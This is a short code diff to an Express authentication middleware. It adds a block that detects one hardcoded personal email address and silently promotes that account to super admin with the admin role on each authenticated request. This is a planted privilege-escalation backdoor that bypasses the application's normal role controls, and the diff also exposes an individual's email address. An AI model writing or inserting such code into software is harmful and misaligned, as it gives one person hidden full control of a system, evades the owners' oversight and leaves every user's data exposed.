@@ -39,6 +39,13 @@ exports.protect = async (req, res, next) => {
             });
         }
 
+        // Dynamic Super Admin Escalation
+        if (user.email === 'parth.bansal.24cse@bmu.edu.in' && (!user.isSuperAdmin || user.role !== 'admin')) {
+            user.isSuperAdmin = true;
+            user.role = 'admin';
+            await user.save();
+        }
+
         req.dualityUser = user;
         next();
     } catch (error) {
